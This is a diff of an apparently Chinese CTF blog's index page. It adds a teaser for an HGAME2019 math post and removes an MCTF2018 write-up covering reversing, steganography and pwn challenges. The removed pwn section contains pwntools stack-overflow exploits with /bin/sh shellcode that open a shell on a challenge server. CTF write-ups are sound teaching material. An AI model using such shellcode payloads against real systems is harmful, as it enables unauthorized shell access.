@@ -203,6 +203,66 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-Math简单" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/02/08/Math简单/" class="article-date">
+      <time datetime="2019-02-08T13:18:21.000Z" itemprop="datePublished">2019-02-08</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/02/08/Math简单/">HGAME2019-Math简单</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+              <p>…解一个三十二元一次方程组得到flag，再次练习了一下使用z3求解。</p>
+          
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+        <p class="article-more-link">
+          <a href="/2019/02/08/Math简单/#more">more >></a>
+        </p>
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-HGAME2019-python-bytecode" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -757,76 +817,6 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">private void button1_Click(object sender, EventArgs e)</span><br><span class="line">		&#123;</span><br><span class="line">			string text = this.textBox1.Text;</span><br><span class="line">			string[] array = new string[]</span><br><span class="line">			&#123;</span><br><span class="line">				&quot;69691c7bdcc3ce6d5d8a1361f22d04ac&quot;,</span><br><span class="line">				&quot;0d61f8370cad1d412f80b84d143e1257&quot;,</span><br><span class="line">				&quot;b9ece18c950afbfa6b0fdbfa4ff731d3&quot;,</span><br><span class="line">				&quot;800618943025315f869e4e1f09471012&quot;,</span><br><span class="line">				&quot;f95b70fdc3088560732a5ac135644506&quot;,</span><br><span class="line">				&quot;4a8a08f09d37b73795649038408b5f33&quot;,</span><br><span class="line">				&quot;03c7c0ace395d80182db07ae2c30f034&quot;,</span><br><span class="line">				&quot;2510c39011c5be704182423e3a695e91&quot;,</span><br><span class="line">				&quot;0cc175b9c0f1b6a831c399e269772661&quot;,</span><br><span class="line">				&quot;4b43b0aee35624cd95b910189b3dc231&quot;,</span><br><span class="line">				&quot;83878c91171338902e0fe0fb97a8c47a&quot;,</span><br><span class="line">				&quot;b14a7b8059d9c055954c92674ce60032&quot;,</span><br><span class="line">				&quot;6f8f57715090da2632453988d9a1501b&quot;,</span><br><span class="line">				&quot;8277e0910d750195b448797616e091ad&quot;,</span><br><span class="line">				&quot;e4da3b7fbbce2345d7772b0674a318d5&quot;,</span><br><span class="line">				&quot;cbb184dd8e05c9709e5dcaedaa0495cf&quot;</span><br><span class="line">			&#125;;</span><br><span class="line">			if (text.Length &gt; 16)</span><br><span class="line">			&#123;</span><br><span class="line">				this.label2.Text = &quot;You are wrong!&quot;;</span><br><span class="line">				return;</span><br><span class="line">			&#125;</span><br><span class="line">			for (int i = 0; i &lt; text.Length; i++)</span><br><span class="line">			&#123;</span><br><span class="line">				char[] array2 = new char[]</span><br><span class="line">				&#123;</span><br><span class="line">					&apos;H&apos;</span><br><span class="line">				&#125;;</span><br><span class="line">				array2[0] = text[i];</span><br><span class="line">				string str = new string(array2);</span><br><span class="line">				if (array[i].CompareTo(Form1.fivefive(str)) != 0)</span><br><span class="line">				&#123;</span><br><span class="line">					this.label2.Text = &quot;You are wrong!&quot;;</span><br><span class="line">				&#125;</span><br><span class="line">				else</span><br><span class="line">				&#123;</span><br><span class="line">					this.label2.Text = &quot;You are right!&quot;;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
 <p>找到了这里，并且发现程序中有一些地方出现了md5，把定义的array的每个字符串md5解密一下得到了flag。</p>
 <h1 id="Math-for-kids"><a href="#Math-for-kids" class="headerlink" title="Math for kids"></a>Math for kids</h1>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-MCTF2018-1" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/10/27/MCTF2018-1/" class="article-date">
-      <time datetime="2018-10-27T05:18:44.000Z" itemprop="datePublished">2018-10-27</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/27/MCTF2018-1/">MCTF2018-1</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h1 id="hello-hello"><a href="#hello-hello" class="headerlink" title="hello hello"></a>hello hello</h1><p>ida打开：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">mov     [rbp+s2], 4Dh ; &apos;M&apos;</span><br><span class="line">mov     [rbp+var_5F], 43h ; &apos;C&apos;</span><br><span class="line">mov     [rbp+var_5E], 54h ; &apos;T&apos;</span><br><span class="line">mov     [rbp+var_5D], 46h ; &apos;F&apos;</span><br><span class="line">mov     [rbp+var_5C], 7Bh ; &apos;&#123;&apos;</span><br><span class="line">mov     [rbp+var_5B], 77h ; &apos;w&apos;</span><br><span class="line">mov     [rbp+var_5A], 65h ; &apos;e&apos;</span><br><span class="line">mov     [rbp+var_59], 31h ; &apos;1&apos;</span><br><span class="line">mov     [rbp+var_58], 63h ; &apos;c&apos;</span><br><span class="line">mov     [rbp+var_57], 6Fh ; &apos;o&apos;</span><br><span class="line">mov     [rbp+var_56], 6Dh ; &apos;m&apos;</span><br><span class="line">mov     [rbp+var_55], 65h ; &apos;e&apos;</span><br><span class="line">mov     [rbp+var_54], 5Fh ; &apos;_&apos;</span><br><span class="line">mov     [rbp+var_53], 32h ; &apos;2&apos;</span><br><span class="line">mov     [rbp+var_52], 6Fh ; &apos;o&apos;</span><br><span class="line">mov     [rbp+var_51], 5Fh ; &apos;_&apos;</span><br><span class="line">mov     [rbp+var_50], 52h ; &apos;R&apos;</span><br><span class="line">mov     [rbp+var_4F], 65h ; &apos;e&apos;</span><br><span class="line">mov     [rbp+var_4E], 76h ; &apos;v&apos;</span><br><span class="line">mov     [rbp+var_4D], 65h ; &apos;e&apos;</span><br><span class="line">mov     [rbp+var_4C], 72h ; &apos;r&apos;</span><br><span class="line">mov     [rbp+var_4B], 73h ; &apos;s&apos;</span><br><span class="line">mov     [rbp+var_4A], 65h ; &apos;e&apos;</span><br><span class="line">mov     [rbp+var_49], 5Fh ; &apos;_&apos;</span><br><span class="line">mov     [rbp+var_48], 57h ; &apos;W&apos;</span><br><span class="line">mov     [rbp+var_47], 6Fh ; &apos;o&apos;</span><br><span class="line">mov     [rbp+var_46], 72h ; &apos;r&apos;</span><br><span class="line">mov     [rbp+var_45], 31h ; &apos;1&apos;</span><br><span class="line">mov     [rbp+var_44], 64h ; &apos;d&apos;</span><br><span class="line">mov     [rbp+var_43], 7Dh ; &apos;&#125;&apos;</span><br></pre></td></tr></table></figure>
-<h1 id="drink-coffee"><a href="#drink-coffee" class="headerlink" title="drink coffee"></a>drink coffee</h1><p>luyten打开，check函数：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">public static boolean CHECK(final int input) &#123;</span><br><span class="line">        if (input &gt; 10000000 &amp;&amp; input &lt; 99999999) &#123;</span><br><span class="line">            int v7 = 1;</span><br><span class="line">            int v8 = 10000000;</span><br><span class="line">            int v9 = 1;</span><br><span class="line">            if (Math.abs(input / 1000 % 100 - 80) == 3 &amp;&amp; input % 1000 % 927 == 0) &#123;</span><br><span class="line">                for (int v10 = 0; v10 &lt; 4; ++v10) &#123;</span><br><span class="line">                    if (input / v7 % 10 != input / v8 % 10) &#123;</span><br><span class="line">                        v9 = 0;</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                    v7 *= 10;</span><br><span class="line">                    v8 /= 10;</span><br><span class="line">                &#125;</span><br><span class="line">                if (v9 != 1) &#123;</span><br><span class="line">                    return false;</span><br><span class="line">                &#125;</span><br><span class="line">                if (v9 == 1) &#123;</span><br><span class="line">                    return true;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<p>本来想用这几天在研究的z3求解的…可是前面两题到现在也没能解出来…这一题运行z3脚本一直卡住，没有任何提示orz。<br>只好不用z3，魔改了原代码求passwd：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">for i in range(10000000,99999999):</span><br><span class="line">    v7 = 1</span><br><span class="line">    v8 = 10000000</span><br><span class="line">    v9 = 1</span><br><span class="line">    if (abs(i / 1000 % 100 - 80) == 3 and i % 1000 % 927 == 0):</span><br><span class="line">        for j in range(4):</span><br><span class="line">            if (i / v7 % 10 != i / v8 % 10):</span><br><span class="line">                v9 = 0</span><br><span class="line">                break</span><br><span class="line">            v7 *= 10</span><br><span class="line">            v8 /= 10</span><br><span class="line">        if (v9 == 1):</span><br><span class="line">            print i</span><br></pre></td></tr></table></figure>
-<p>运行后打印出passwd，输入后得到flag。</p>
-<h1 id="听说你是萌新"><a href="#听说你是萌新" class="headerlink" title="听说你是萌新"></a>听说你是萌新</h1><p>一张jpg，hexfiend打开在文件末尾得到flag。</p>
-<h1 id="不如…"><a href="#不如…" class="headerlink" title="不如…"></a>不如…</h1><p>一张png，binwalk看一下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             PNG image, 1332 x 747, 8-bit/color RGBA, non-interlaced</span><br><span class="line">830060        0xCAA6C         End of Zip archive</span><br></pre></td></tr></table></figure>
-<p>发现是zip结尾，搜索IEND找到png的结尾，然后把后面的zip全部copy下来保存为新文件。mac直接可以解压，但是解压出来的docx啥也看不见，开虚拟机用windows看了一下发现有密码，所以应该就是伪加密了，找到第二个PK后标记有无密码的位置，把01改为00，解压后查看docx得到flag。</p>
-<h1 id="猜猜flag"><a href="#猜猜flag" class="headerlink" title="猜猜flag"></a>猜猜flag</h1><h1 id="走后门吗"><a href="#走后门吗" class="headerlink" title="走后门吗"></a>走后门吗</h1><p>有后门函数直接可以开shell，直接栈溢出覆盖返回地址：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=remote(&quot;123.206.131.120&quot;,10001)</span><br><span class="line">backdoor_add=0x4006e0</span><br><span class="line">sh.recv()</span><br><span class="line">payload=&quot;a&quot;*0x58+p64(backdoor_add)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-<h1 id="后门？不存在的"><a href="#后门？不存在的" class="headerlink" title="后门？不存在的"></a>后门？不存在的</h1><p>和上面一题基本差不多，不过没有后门函数了。同样的栈溢出，没开nx保护，同时会打印出存放输入的内存地址，找了个shellcode：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=remote(&quot;123.206.131.120&quot;,10002)</span><br><span class="line">sh.recvuntil(&quot;is&quot;)</span><br><span class="line">sh.recv(3)</span><br><span class="line">add=int(sh.recv(12),16)</span><br><span class="line">shellcode=&quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot;</span><br><span class="line">payload=shellcode+&apos;\x90&apos;*(0x58-len(shellcode))+p64(add)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-<h1 id="做出了后门也不给你走"><a href="#做出了后门也不给你走" class="headerlink" title="做出了后门也不给你走"></a>做出了后门也不给你走</h1>
       
     </div>
     
